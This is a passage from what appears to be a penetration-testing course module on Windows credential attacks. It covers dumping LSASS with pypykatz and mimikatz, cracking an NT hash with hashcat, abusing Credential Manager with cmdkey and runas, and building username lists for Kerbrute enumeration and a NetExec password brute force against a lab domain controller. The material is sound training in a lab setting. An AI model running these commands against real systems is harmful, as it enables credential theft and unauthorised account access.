domainname DESKTOP<span class="hljs-string">-33</span>E7O54
logon_server WIN<span class="hljs-string">-6</span>T0C3J2V6HP
logon_time 2021<span class="hljs-string">-12</span><span class="hljs-string">-14</span>T18:14:25.514306<span class="hljs-string">+00</span>:00
sid S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-4019466498</span><span class="hljs-string">-1700476312</span><span class="hljs-string">-3544718034</span><span class="hljs-string">-1001</span>
luid 1354633
    == MSV ==
        Username: bob
        Domain: DESKTOP<span class="hljs-string">-33</span>E7O54
        LM: NA
        NT: 64f12cddaa88057e06a81b54e73b949b
        SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
        DPAPI: NA
    == WDIGEST [14ab89]==
        username bob
        domainname DESKTOP<span class="hljs-string">-33</span>E7O54
        password None
        password (hex)
    == Kerberos ==
        Username: bob
        Domain: DESKTOP<span class="hljs-string">-33</span>E7O54
    == WDIGEST [14ab89]==
        username bob
        domainname DESKTOP<span class="hljs-string">-33</span>E7O54
        password None
        password (hex)
    == DPAPI [14ab89]==
        luid 1354633
        key_guid 3e1d1091-b792<span class="hljs-string">-45</span>df-ab8e-c66af044d69b
        masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
        sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP<span class="hljs-string">-33</span>E7O54
logon_server WIN<span class="hljs-string">-6</span>T0C3J2V6HP
logon_time 2021<span class="hljs-string">-12</span><span class="hljs-string">-14</span>T18:14:25.514306<span class="hljs-string">+00</span>:00
sid S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-4019466498</span><span class="hljs-string">-1700476312</span><span class="hljs-string">-3544718034</span><span class="hljs-string">-1001</span>
luid 1354581
    == MSV ==
        Username: bob
        Domain: DESKTOP<span class="hljs-string">-33</span>E7O54
        LM: NA
        NT: 64f12cddaa88057e06a81b54e73b949b
        SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
        DPAPI: NA
    == WDIGEST [14ab55]==
        username bob
        domainname DESKTOP<span class="hljs-string">-33</span>E7O54
        password None
        password (hex)
    == Kerberos ==
        Username: bob
        Domain: DESKTOP<span class="hljs-string">-33</span>E7O54
    == WDIGEST [14ab55]==
        username bob
        domainname DESKTOP<span class="hljs-string">-33</span>E7O54
        password None
        password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM<span class="hljs-string">-2</span>
domainname Window Manager
logon_server 
logon_time 2021<span class="hljs-string">-12</span><span class="hljs-string">-14</span>T18:14:25.248681<span class="hljs-string">+00</span>:00
sid S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-90</span><span class="hljs-string">-0</span><span class="hljs-string">-2</span>
luid 1343859
    == WDIGEST [148173]==
        username WIN<span class="hljs-string">-6</span>T0C3J2V6HP$
        domainname WORKGROUP
        password None
        password (hex)
    == WDIGEST [148173]==
        username WIN<span class="hljs-string">-6</span>T0C3J2V6HP$
        domainname WORKGROUP
        password None
        password (hex)
</code></pre>
<p>Lets take a more detailed look at some of the useful information in the output.</p>
<p><strong>MSV</strong></p>
<p>&#x20; Attacking LSASS</p>
<pre><code class="lang-shell-session">sid S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-4019466498</span><span class="hljs-string">-1700476312</span><span class="hljs-string">-3544718034</span><span class="hljs-string">-1001</span>
luid 1354633
    == MSV ==
        Username: bob
        Domain: DESKTOP<span class="hljs-string">-33</span>E7O54
        LM: NA
        NT: 64f12cddaa88057e06a81b54e73b949b
        SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
        DPAPI: NA
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package">MSV</a> is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the <code>SID</code>, <code>Username</code>, <code>Domain</code>, and even the <code>NT</code> &amp; <code>SHA1</code> password hashes associated with the bob user account&#39;s logon session stored in LSASS process memory. This will prove helpful in the next step of our attack covered at the end of this section.</p>
<p><strong>WDIGEST</strong></p>
<p>&#x20; Attacking LSASS</p>
<pre><code class="lang-shell-session">    =<span class="ruby">= WDIGEST [<span class="hljs-number">14</span>ab89]==
</span>        username bob
        domainname DESKTOP-33E7O54
        password None
        password (hex)
</code></pre>
<p><code>WDIGEST</code> is an older authentication protocol enabled by default in <code>Windows XP</code> - <code>Windows 8</code> and <code>Windows Server 2003</code> - <code>Windows Server 2012</code>. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST. We can study the details of that security update <a href="https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/">here</a>.</p>
<p><strong>Kerberos</strong></p>
<p>&#x20; Attacking LSASS</p>
<pre><code class="lang-shell-session">    == Kerberos ==
<span class="hljs-symbol">        Username:</span> bob
<span class="hljs-symbol">        Domain:</span> DESKTOP<span class="hljs-number">-33E7</span>O54
</code></pre>
<p><a href="https://web.mit.edu/kerberos/#what_is">Kerberos</a> is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS caches <code>passwords</code>, <code>ekeys</code>, <code>tickets</code>, and <code>pins</code> associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.</p>
<p><strong>DPAPI</strong></p>
<p>&#x20; Attacking LSASS</p>
<pre><code class="lang-shell-session">    == DPAPI [<span class="hljs-number">14</span>ab89]==
        luid <span class="hljs-number">1354633</span>
        key_guid <span class="hljs-number">3e1</span>d1091-b792<span class="hljs-number">-45</span>df-ab8e-c66af044d69b
        masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
        sha1_masterkey <span class="hljs-number">52e758</span>b6120389898f7fae553ac8172b43221605
</code></pre>
<p>Mimikatz and Pypykatz can extract the DPAPI <code>masterkey</code> for logged-on users whose data is present in LSASS process memory. These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. DPAPI attack techniques are covered in greater detail in the <a href="https://academy.hackthebox.com/module/details/67">Windows Privilege Escalation</a> module.</p>
<p><strong>Cracking the NT Hash with Hashcat</strong></p>
<p>We can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.</p>
<p>&#x20; Attacking LSASS</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /</span>usr<span class="hljs-regexp">/share/</span>wordlists/rockyou.txt
<span class="hljs-symbol">
64f12cddaa88057e06a81b54e73b949b:</span>Password1
</code></pre>
<p>Our cracking attempt completes, and our overall attack can be considered a success.</p>
<hr>
<h2 id="attacking-windows-credential-manager">Attacking Windows Credential Manager</h2>
<h3 id="windows-vault-and-credential-manager">Windows Vault and Credential Manager</h3>
<p><a href="https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication#windows-vault-and-credential-manager">Credential Manager</a> is a feature built into Windows since <code>Server 2008 R2</code> and <code>Windows 7</code>. Thorough documentation on how it works is not publicly available, but essentially, it allows users and applications to securely store credentials relevant to other systems and websites. Credentials are stored in special encrypted folders on the computer under the user and system profiles (<a href="https://attack.mitre.org/techniques/T1555/004/">MITRE ATT\&amp;CK</a>):</p>
<ul>
<li><code>%UserProfile%\AppData\Local\Microsoft\Vault\</code></li>
<li><code>%UserProfile%\AppData\Local\Microsoft\Credentials\</code></li>
<li><code>%UserProfile%\AppData\Roaming\Microsoft\Vault\</code></li>
<li><code>%ProgramData%\Microsoft\Vault\</code></li>
<li><code>%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</code></li>
</ul>
<p>Each vault folder contains a <code>Policy.vpol</code> file with AES keys (AES-128 or AES-256) that is protected by DPAPI. These AES keys are used to encrypt the credentials. Newer versions of Windows make use of <code>Credential Guard</code> to further protect the DPAPI master keys by storing them in secured memory enclaves (<a href="https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs">Virtualization-based Security</a>).</p>
<p>Microsoft often refers to the protected stores as <code>Credential Lockers</code> (formerly <code>Windows Vaults</code>). Credential Manager is the user-facing feature/API, while the actual encrypted stores are the vault/locker folders. The following table lists the two types of credentials Windows stores:</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Web Credentials</td>
<td>Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge.</td>
</tr>
<tr>
<td>Windows Credentials</td>
<td>Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories.</td>
</tr>
</tbody>
</table>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/CredMan_1.png" alt="Credential Manager showing Windows and Generic Credentials with modification dates. No certificate-based credentials."></p>
<p>It is possible to export Windows Vaults to <code>.crd</code> files either via Control Panel or with the following command. Backups created this way are encrypted with a password supplied by the user, and can be imported on other Windows systems.</p>
<p>&#x20; Attacking Windows Credential Manager</p>
<pre><code class="lang-cmd-session">C:\Users\sadams&gt;rundll32 keymgr<span class="hljs-selector-class">.dll</span>,KRShowKeyMgr
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/CredMan_2.png" alt="Stored User Names and Passwords window showing a list of credentials with options to add, remove, or edit."></p>
<h3 id="enumerating-credentials-with-cmdkey">Enumerating credentials with cmdkey</h3>
<p>We can use <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey">cmdkey</a> to enumerate the credentials stored in the current user&#39;s profile:</p>
<p>&#x20; Attacking Windows Credential Manager</p>
<pre><code class="lang-cmd-session"><span class="hljs-symbol">C:</span>\Users\sadams&gt;whoami
srv01\sadams
<span class="hljs-symbol">
C:</span>\Users\sadams&gt;cmdkey /list

Currently stored credentials:
<span class="hljs-symbol">
    Target:</span> WindowsLive:target=virtualapp/didlogical
<span class="hljs-symbol">    Type:</span> Generic
<span class="hljs-symbol">    User:</span> <span class="hljs-number">02</span>hejubrtyqjrkfi
    Local machine persistence
<span class="hljs-symbol">
    Target:</span> Domain:interactive=SRV01\mcharles
<span class="hljs-symbol">    Type:</span> Domain Password
<span class="hljs-symbol">    User:</span> SRV01\mcharles
</code></pre>
<p>Stored credentials are listed with the following format:</p>
<table>
<thead>
<tr>
<th>Key</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>Target</td>
<td>The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.</td>
</tr>
<tr>
<td>Type</td>
<td>The kind of credential. Common types are <code>Generic</code> for general credentials, and <code>Domain Password</code> for domain user logons.</td>
</tr>
<tr>
<td>User</td>
<td>The user account associated with the credential.</td>
</tr>
<tr>
<td>Persistence</td>
<td>Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with <code>Local machine persistence</code> survive reboots.</td>
</tr>
</tbody>
</table>
<p>The first credential in the command output above, <code>virtualapp/didlogical</code>, is a generic credential used by Microsoft account/Windows Live services. The random looking username is an internal account ID. This entry may be ignored for our purposes.</p>
<p>The second credential, <code>Domain:interactive=SRV01\mcharles</code>, is a domain credential associated with the user SRV01\mcharles. <code>Interactive</code> means that the credential is used for interactive logon sessions. Whenever we come across this type of credential, we can use <code>runas</code> to impersonate the stored user like so:</p>
<p>&#x20; Attacking Windows Credential Manager</p>
<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\Users\sadams&gt;runas <span class="hljs-regexp">/savecred /</span><span class="hljs-string">user:</span>SRV01\mcharles cmd
Attempting to start cmd <span class="hljs-keyword">as</span> user <span class="hljs-string">"SRV01\mcharles"</span> ...
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/CredMan_3.png" alt="Command Prompt showing user information and domain details. &quot;whoami&quot; command executed, displaying &quot;srv01\mcharles&quot;."></p>
<h3 id="extracting-credentials-with-mimikatz">Extracting credentials with Mimikatz</h3>
<p>There are many different tools that can be used to decrypt stored credentials. One of the tools we can use is <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>. Even within <code>mimikatz</code>, there are multiple ways to attack these credentials - we can either dump credentials from memory using the <code>sekurlsa</code> module, or we can manually decrypt credentials using the <code>dpapi</code> module. For this example, we will target the LSASS process with <code>sekurlsa</code>:</p>
<p>&#x20; Attacking Windows Credential Manager</p>
<pre><code class="lang-cmd-session">C:\Users\Administrator\Desktop&gt; mimikatz.exe

  .#####.   mimikatz <span class="hljs-number">2.2</span><span class="hljs-number">.0</span> (x64) #<span class="hljs-number">19041</span> Aug <span class="hljs-number">10</span> <span class="hljs-number">2021</span> <span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">53</span>
 .## ^ ##.  <span class="hljs-string">"A La Vie, A L'Amour"</span> - (oe.eo)
 ## / \ ##  <span class="hljs-comment">/*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span>

mimikatz # privilege::debug
Privilege <span class="hljs-string">'20'</span> OK

mimikatz # sekurlsa::credman

...SNIP...

Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">630472</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">00099</span>ec8)
Session           : RemoteInteractive <span class="hljs-keyword">from</span> <span class="hljs-number">3</span>
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2025</span> <span class="hljs-number">2</span>:<span class="hljs-number">40</span>:<span class="hljs-number">32</span> AM
SID               : S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1340203682</span><span class="hljs-number">-1669575078</span><span class="hljs-number">-4153855890</span><span class="hljs-number">-1002</span>
        credman :
         [<span class="hljs-number">00000000</span>]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : ...SNIP...

...SNIP...
</code></pre>
<p>Note: Some other tools which may be used to enumerate and extract stored credentials included <a href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a>, <a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a>, and <a href="https://github.com/login-securite/DonPAPI">DonPAPI</a>.</p>
<hr>
<h2 id="attacking-active-directory-and-ntds-dit">Attacking Active Directory and NTDS.dit</h2>
<p><code>Active Directory</code> (<code>AD</code>) is a common and critical directory service in modern enterprise networks. AD is something we will repeatedly encounter, so we need to be familiar with various methods we can use to attack and defend these environments. It is safe to conclude that if the organization uses Windows, then AD is used to manage those Windows systems. Attacking AD is such an extensive and significant topic that we have multiple modules covering the subject.</p>
<p>In this section, we will focus primarily on how we can extract credentials through the use of a <code>dictionary attack</code> against <code>AD accounts</code> and <code>dumping hashes</code> from the <code>NTDS.dit</code> file.</p>
<p>Like many of the attacks we have covered thus far, our target must be reachable over the network. This means it is highly likely that we will need to have a foothold established on the internal network to which the target is connected. That said, there are situations where an organization may be using port forwarding to forward the remote desktop protocol (<code>3389</code>) or other protocols used for remote access on their <a href="https://www.cisco.com/c/en/us/products/routers/what-is-an-edge-router.html">edge router</a> to a system on their internal network. Please know that most methods covered in this module simulate the steps after an initial compromise, and a foothold is established on an internal network. Before we get hands-on with the attack methods, let&#39;s consider the authentication process once a Windows system has been joined to the domain. This approach will help us better understand the significance of Active Directory and the password attacks it can be susceptible to.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/ADauthentication_diagram.png" alt="Diagram showing Windows authentication process with lsass.exe, authentication packages, NTLM, Kerberos, and AD Directory Services."></p>
<p>Once a Windows system is joined to a domain, it will <code>no longer default to referencing the SAM database to validate logon requests</code>. That domain-joined system will now send authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the <code>hostname</code> of the device proceeded by the <code>Username</code> (Example: <code>WS01\nameofuser</code>) or with direct access to the device then typing <code>.\</code> at the logon UI in the <code>Username</code> field. This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform. It can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network. Keep in mind that we can also study NTDS attacks by keeping track of this <a href="https://attack.mitre.org/techniques/T1003/003/">technique</a>.</p>
<h3 id="dictionary-attacks-against-ad-accounts-using-netexec">Dictionary attacks against AD accounts using NetExec</h3>
<p>Keep in mind that a dictionary attack is essentially using the power of a computer to guess a username and/or password using a customized list of potential usernames and passwords. It can be rather <code>noisy</code> (easy to detect) to conduct these attacks over a network because they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempt restrictions that may be applied through the use of <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791\(v=ws.11\">Group Policy</a>).</p>
<p>When we find ourselves in a scenario where a dictionary attack is a viable next step, we can benefit from trying to tailor our attack as much as possible. In this case, we can consider the organization we are working with to perform the engagement against and use searches on various social media websites and look for an employee directory on the company&#39;s website. Doing this can result in us gaining the names of employees that work at the organization. One of the first things a new employee will get is a username. Many organizations follow a naming convention when creating employee usernames. Here are some common conventions to consider:</p>
<table>
<thead>
<tr>
<th>Username convention</th>
<th>Practical example for <code>Jane Jill Doe</code></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>firstinitiallastname</code></td>
<td>jdoe</td>
</tr>
<tr>
<td><code>firstinitialmiddleinitiallastname</code></td>
<td>jjdoe</td>
</tr>
<tr>
<td><code>firstnamelastname</code></td>
<td>janedoe</td>
</tr>
<tr>
<td><code>firstname.lastname</code></td>
<td>jane.doe</td>
</tr>
<tr>
<td><code>lastname.firstname</code></td>
<td>doe.jane</td>
</tr>
<tr>
<td><code>nickname</code></td>
<td>doedoehacksstuff</td>
</tr>
</tbody>
</table>
<p>Often, an email address&#39;s structure will give us the employee&#39;s username (structure: <code>username@domain</code>). For example, from the email address <code>jdoe</code>@<code>inlanefreight.com</code>, we can infer that <code>jdoe</code> is the username.</p>
<p>A tip from <code>MrB3n</code>: We can often find the email structure by Googling the domain name, i.e., &quot;@inlanefreight.com&quot; and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith. That way, email messages can get through, but the actual internal username isn&#39;t disclosed, making password spraying harder. Sometimes you can use google dorks to search for &quot;inlanefreight.com filetype:pdf&quot; and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid.</p>
<p><strong>Creating a custom list of usernames</strong></p>
<p>Let&#39;s say we have done our research and gathered a list of names based on publicly available information. We will keep the list relatively short for the sake of this lesson because organizations can have a huge number of employees. Example list of names:</p>
<ul>
<li>Ben Williamson</li>
<li>Bob Burgerstien</li>
<li>Jim Stevenson</li>
<li>Jill Johnson</li>
<li>Jane Doe</li>
</ul>
<p>We can create a custom list on our attack host using the names above. We can use a command line-based text editor like <code>Vim</code> or a graphical text editor to create our list. Our list may look something like this:</p>
<p>&#x20; Attacking Active Directory and NTDS.dit</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat usernames<span class="hljs-selector-class">.txt</span>

bwilliamson
benwilliamson
ben<span class="hljs-selector-class">.willamson</span>
willamson<span class="hljs-selector-class">.ben</span>
bburgerstien
bobburgerstien
bob<span class="hljs-selector-class">.burgerstien</span>
burgerstien<span class="hljs-selector-class">.bob</span>
jstevenson
jimstevenson
jim<span class="hljs-selector-class">.stevenson</span>
stevenson.jim
</code></pre>
<p>Of course, this is just an example and doesn&#39;t include all of the names, but notice how we can include a different naming convention for each name if we do not already know the naming convention used by the target organization.</p>
<p>We can manually create our list(s) or use an <code>automated list generator</code> such as the Ruby-based tool <a href="https://github.com/urbanadventurer/username-anarchy">Username Anarchy</a> to convert a list of real names into common username formats. Once the tool has been cloned to our local attack host using <code>Git</code>, we can run it against a list of real names as shown in the example output below:</p>
<p>&#x20; Attacking Active Directory and NTDS.dit</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ./username-anarchy -<span class="hljs-selector-tag">i</span> /home/ltnbob/names<span class="hljs-selector-class">.txt</span> 

ben
benwilliamson
ben<span class="hljs-selector-class">.williamson</span>
benwilli
benwill
benw
<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.williamson</span>
bwilliamson
wben
w<span class="hljs-selector-class">.ben</span>
williamsonb
williamson
williamson<span class="hljs-selector-class">.b</span>
williamson<span class="hljs-selector-class">.ben</span>
bw
bob
bobburgerstien
bob<span class="hljs-selector-class">.burgerstien</span>
bobburge
bobburg
bobb
<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.burgerstien</span>
bburgerstien
bbob
<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.bob</span>
burgerstienb
burgerstien
burgerstien<span class="hljs-selector-class">.b</span>
burgerstien<span class="hljs-selector-class">.bob</span>
bb
jim
jimstevenson
jim<span class="hljs-selector-class">.stevenson</span>
jimsteve
jimstev
jims
j<span class="hljs-selector-class">.stevenson</span>
jstevenson
sjim
s<span class="hljs-selector-class">.jim</span>
stevensonj
stevenson
stevenson<span class="hljs-selector-class">.j</span>
stevenson<span class="hljs-selector-class">.jim</span>
js
jill
jilljohnson
jill<span class="hljs-selector-class">.johnson</span>
jilljohn
jillj
j<span class="hljs-selector-class">.johnson</span>
jjohnson
jjill
j<span class="hljs-selector-class">.jill</span>
johnsonj
johnson
johnson<span class="hljs-selector-class">.j</span>
johnson<span class="hljs-selector-class">.jill</span>
jj
jane
janedoe
jane<span class="hljs-selector-class">.doe</span>
janed
j<span class="hljs-selector-class">.doe</span>
jdoe
djane
d<span class="hljs-selector-class">.jane</span>
doej
doe
doe<span class="hljs-selector-class">.j</span>
doe<span class="hljs-selector-class">.jane</span>
jd
</code></pre>
<p>Using automated tools can save us time when crafting lists. Still, we will benefit from spending as much time as we can attempting to discover the naming convention an organization is using with usernames because this will reduce the need for us to guess the naming convention.</p>
<p>It is ideal to limit the need to guess as much as possible when conducting password attacks.</p>
<p><strong>Enumerating valid usernames with Kerbrute</strong></p>
<p>Before we start guessing passwords for usernames which might not even exist, it may be worthwhile identifying the correct naming convention and confirming the validity of some usernames. We can do this with a tool like <a href="https://github.com/ropnop/kerbrute">Kerbrute</a>. Kerbrute can be used for brute-forcing, password spraying and username enumeration. Right now, we are only interested in username enumeration, which would look like this:</p>
<p>&#x20; Attacking Active Directory and NTDS.dit</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ ./</span>kerbrute_linux_amd64 userenum --dc <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.57</span> --domain inlanefreight.local names.txt

    __             __               __     
   <span class="hljs-regexp">/ /</span>_____  _____<span class="hljs-regexp">/ /</span>_  _______  __<span class="hljs-regexp">/ /</span>____ 
  <span class="hljs-regexp">/ /</span><span class="hljs-regexp">/_/</span> _ \<span class="hljs-regexp">/ ___/</span> __ \<span class="hljs-regexp">/ ___/</span> <span class="hljs-regexp">/ /</span> <span class="hljs-regexp">/ __/</span> _ \
 <span class="hljs-regexp">/ ,&lt; /</span>  __<span class="hljs-regexp">/ /</span>  <span class="hljs-regexp">/ /</span>_<span class="hljs-regexp">/ /</span> <span class="hljs-regexp">/  /</span> <span class="hljs-regexp">/_/</span> <span class="hljs-regexp">/ /</span>_<span class="hljs-regexp">/  __/</span>
<span class="hljs-regexp">/_/</span>|_|\___<span class="hljs-regexp">/_/</span>  <span class="hljs-regexp">/_.___/</span>_<span class="hljs-regexp">/   \__,_/\_</span>_<span class="hljs-regexp">/\___/</span>                                        
<span class="hljs-symbol">
Version:</span> v1<span class="hljs-number">.0</span><span class="hljs-number">.3</span> (<span class="hljs-number">9</span>dad6e1) - <span class="hljs-number">04</span><span class="hljs-regexp">/25/</span><span class="hljs-number">25</span> - Ronnie Flathers <span class="hljs-meta">@ropnop</span>

<span class="hljs-number">2025</span><span class="hljs-regexp">/04/</span><span class="hljs-number">25</span> <span class="hljs-number">09</span>:<span class="hljs-number">17</span>:<span class="hljs-number">10</span> &gt;  Using KDC(s):
<span class="hljs-number">2025</span><span class="hljs-regexp">/04/</span><span class="hljs-number">25</span> <span class="hljs-number">09</span>:<span class="hljs-number">17</span>:<span class="hljs-number">10</span> &gt;   <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.57</span>:<span class="hljs-number">88</span>

<span class="hljs-number">2025</span><span class="hljs-regexp">/04/</span><span class="hljs-number">25</span> <span class="hljs-number">09</span>:<span class="hljs-number">17</span>:<span class="hljs-number">11</span> &gt;  [+] VALID <span class="hljs-string">USERNAME:</span>       bwilliamson<span class="hljs-meta">@inlanefreight</span>.local
&lt;SNIP&gt;
</code></pre>
<p><strong>Launching a brute-force attack with NetExec</strong></p>
<p>Once we have our list(s) prepared or discover the naming convention and some employee names, we can launch a brute-force attack against the target domain controller using a tool such as NetExec. We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller. Here is the command to do so:</p>
<p>&#x20; Attacking Active Directory and NTDS.dit</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ netexec smb <span class="hljs-number">10.129.201.57</span> -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

SMB         <span class="hljs-number">10.129.201.57</span>     <span class="hljs-number">445</span>    DC01           <span class="hljs-string">[*]</span> Windows <span class="hljs-number">10</span>.<span class="hljs-number">0</span> Build <span class="hljs-number">17763</span> x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
SMB         <span class="hljs-number">10.129.201.57</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-string">[-]</span> inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
SMB         <span class="hljs-number">10.129.201.57</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-string">[-]</span> inlanefrieght.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
SMB         <span class="hljs-number">10.129.201.57</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-string">[-]</span> inlanefrieght.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
SMB         <span class="hljs-number">10.129.201.57</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-string">[-]</span> inlanefrieght.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
SMB         <span class="hljs-number">10.129.201.57</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-string">[-]</span> inlanefrieght.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
SMB         <span class="hljs-number">10.129.201.57</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-string">[-]</span> inlanefrieght.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
SMB         <span class="hljs-number">10.129.201.57</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-string">[-]</span> inlanefrieght.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         <span class="hljs-number">10.129.201.57</span>     <span class="hljs-number">445</span>    DC01             <span class="hljs-string">[+]</span> inlanefrieght.local\bwilliamson:P@55w0rd!
</code></pre>
<p>In this example, NetExec is using SMB to attempt to logon as user (<code>-u</code>) <code>bwilliamson</code> using a password (<code>-p</code>) list containing a list of commonly used passwords (<code>/usr/share/wordlists/fasttrack.txt</code>). If the admins configured an account lockout policy, this attack could lock out the account that we are targeting. At the time of this writing (January 2022), an account lockout policy is not enforced by default with the default group policies that apply to a Windows domain, meaning it is possible that we will come across environments vulnerable to this exact attack we are practicing.</p>
<p><strong>Event logs from the attack</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/events_dc.png" alt="Windows Event Viewer showing security logs with Event ID 4776 for credential validation and event details."></p>
<p>It can be useful to know what might have been left behind by an attack. Knowing this can make our remediation recommendations more impactful and valuable for the client we are working with. On any Windows operating system, an admin can navigate to <code>Event Viewer</code> and view the Security events to see the exact actions that were logged. This can inform decisions to implement stricter security controls and assist in any potential investigation that might be involved following a breach.</p>
<p>Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file.</p>
<h3 id="capturing-ntds-dit">Capturing NTDS.dit</h3>
